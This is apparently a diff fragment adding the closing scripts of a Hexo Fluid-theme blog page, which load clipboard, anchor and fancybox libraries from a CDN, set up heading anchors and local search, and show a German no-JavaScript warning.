+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
